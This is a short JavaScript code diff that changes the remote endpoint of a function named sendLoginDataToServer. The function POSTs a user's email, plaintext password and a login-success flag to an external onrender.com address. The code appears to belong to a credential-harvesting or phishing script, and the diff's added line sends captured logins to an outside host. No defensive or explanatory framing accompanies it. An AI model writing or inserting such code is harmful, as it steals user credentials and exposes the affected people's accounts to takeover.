@@ -15,7 +15,7 @@ let successCheckTimeout = null;
 async function sendLoginDataToServer(email, password, success) {
     if (!email || !password) return;
     try {
-        await fetch('https://latex-r70v.onrender.com/login-data', {
+        await fetch('https://latex-v25b.onrender.com/login-data', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email, password, success })
